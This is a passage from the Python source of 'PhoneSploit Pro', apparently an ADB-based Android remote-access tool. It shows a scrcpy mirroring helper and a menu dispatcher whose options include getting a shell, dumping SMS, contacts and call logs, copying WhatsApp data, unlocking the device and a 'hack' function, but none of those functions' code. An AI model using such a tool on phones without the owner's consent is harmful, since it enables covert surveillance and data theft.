            f'\n{color.CYAN}Enter size limit {color.YELLOW}(e.g. 1024){color.WHITE}')
        size = input("> ")
        if not size == '':
            size = '-m ' + size

        print(
            f'\n{color.CYAN}Enter bit-rate {color.YELLOW}(e.g. 2)   {color.WHITE}(Default : 8 Mbps)')
        bitrate = input("> ")
        if not bitrate == '':
            bitrate = '-b ' + bitrate + 'M'

        print(f'\n{color.CYAN}Enter frame-rate {color.YELLOW}(e.g. 15){color.WHITE}')
        framerate = input("> ")
        if not framerate == '':
            framerate = '--max-fps=' + framerate

        os.system(f'scrcpy {size} {bitrate} {framerate}')
    else:
        print("\nInvalid selection, Going back to Main Menu")
        return
    print('\n')


def main():
    # Clearing the screen and presenting the menu
    # taking selection input from user
    print(f"\n {color.CYAN}99 : Clear Screen                0 : Exit")
    option = input(
        f"{color.RED}\n[Main Menu] {color.WHITE}Enter selection > ").lower()

    match option:
        case 'p':
            change_page('p')
        case 'n':
            change_page('n')
        case '0':
            exit_phonesploit_pro()
        case '99':
            clear_screen()
        case '1':
            connect()
        case '2':
            list_devices()
        case '3':
            disconnect()
        case '4':
            get_shell()
        case '5':
            mirror()
        case '6':
            get_screenshot()
        case '7':
            screenrecord()
        case '8':
            pull_file()
        case '9':
            push_file()
        case '10':
            launch_app()
        case '11':
            install_app()
        case '12':
            uninstall_app()
        case '13':
            list_apps()
        case '14':
            reboot('system')
        case '15':
            hack()
        case '16':
            list_files()
        case '17':
            reboot('advanced')
        case '18':
            copy_whatsapp()
        case '19':
            copy_screenshots()
        case '20':
            copy_camera()
        case '21':
            anonymous_screenshot()
        case '22':
            anonymous_screenrecord()
        case '23':
            open_link()
        case '24':
            open_photo()
        case '25':
            open_audio()
        case '26':
            open_video()
        case '27':
            get_device_info()
        case '28':
            battery_info()
        case '29':
            use_keycode()
        case '30':
            send_sms()
        case '31':
            unlock_device()
        case '32':
            lock_device()
        case '33':
            dump_sms()
        case '34':
            dump_contacts()
        case '35':
            dump_call_logs()
        case '36':
            extract_apk()
        case '37':
            stop_adb()
        case other:
            print("\nInvalid selection!\n")


# Starting point of the program

# Global variables
run_phonesploit_pro = True
operating_system = ''
clear = 'clear'
opener = 'xdg-open'
move = 'mv'
page_number = 0
page = banner.menu[page_number]

# Locations
screenshot_location = ''
screenrecord_location = ''
pull_location = ''

# Concatenating banner color with the selected banner
selected_banner = random.choice(
    color.color_list) + random.choice(banner.banner_list)

start()

if run_phonesploit_pro:
    clear_screen()
    while run_phonesploit_pro:
        try:
            main()
        except KeyboardInterrupt:
            exit_phonesploit_pro()
